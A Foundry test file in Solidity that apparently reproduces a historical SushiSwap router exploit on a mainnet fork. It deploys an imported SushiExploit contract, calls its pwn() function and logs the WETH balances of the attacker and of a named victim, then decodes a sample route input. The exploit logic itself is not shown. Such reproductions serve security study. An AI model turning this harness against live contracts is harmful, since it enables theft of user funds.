// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;
import "../src/AccessControl/SushiRouter/SushiAttacker.sol";
import "../src/AccessControl/SushiRouter/InputStream.sol";
import "forge-std/Test.sol";

interface WETH {
    function balanceOf(address addr) external view returns (uint256);
}

contract Sushi is Test {
    using InputStream for uint256;
    address attacker;
    SushiExploit internal sushiExploit;
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", 17007838);
        attacker = makeAddr("attacker");
        vm.label(address(weth), "WETHContract");
    }

    //------------
    function testHack() public {
        vm.startPrank(attacker);
        sushiExploit = new SushiExploit();
        sushiExploit.pwn();
        vm.stopPrank();
        console.log(
            "WETH BALANCE OF SUSHIEXPLOITer : %s ",
            weth.balanceOf(address(attacker))
        );
        console.log(
            "WETH BALANCE OF 0xSifu.eth : %s ",
            weth.balanceOf(address(0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1))
        );

        //==================== JUST TO UNDERSTAND Route input  not relevent to exploit ==============
        bytes memory route = abi.encodePacked(
            uint8(4),
            address(sushiExploit),
            uint8(1),
            address(sushiExploit),
            true,
            address(sushiExploit)
        );
        uint256 stream = InputStream.createStream(route);
        console.log("STREAM  : %s ", stream);
        uint8 commandCode = stream.readUint8();
        console.log("commandCode : %s ", commandCode);
        address addressCode = stream.readAddress();
        console.log("addressCode: %s ", addressCode);
    }

    //FLASHLOAN CALLS
}
